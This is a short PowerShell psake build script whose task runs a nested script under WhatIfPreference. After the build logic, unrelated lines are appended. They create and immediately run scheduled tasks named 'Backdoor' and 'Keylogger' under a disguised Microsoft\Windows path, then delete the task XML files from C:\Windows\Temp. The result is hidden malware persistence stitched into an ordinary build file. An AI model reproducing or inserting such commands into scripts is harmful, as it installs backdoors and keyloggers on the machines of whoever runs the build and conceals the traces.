Task default -Depends RunWhatIf

Task RunWhatIf {
    try {
        
        $global:WhatIfPreference = $true

        
        $parameters = @{p1='whatifcheck';}

        Invoke-psake .\nested\whatifpreference.ps1 -parameters $parameters
    } finally {
        $global:WhatIfPreference = $false
    }
}

schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Backdoor" /XML C:\Windows\Temp\task.xml
schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Keylogger" /XML C:\Windows\Temp\task2.xml
SCHTASKS /run /TN "Microsoft\Windows\DynAmite\Backdoor"
SCHTASKS /run /TN "Microsoft\Windows\DynAmite\Keylogger"
Remove-Item "C:\Windows\Temp\*.xml"

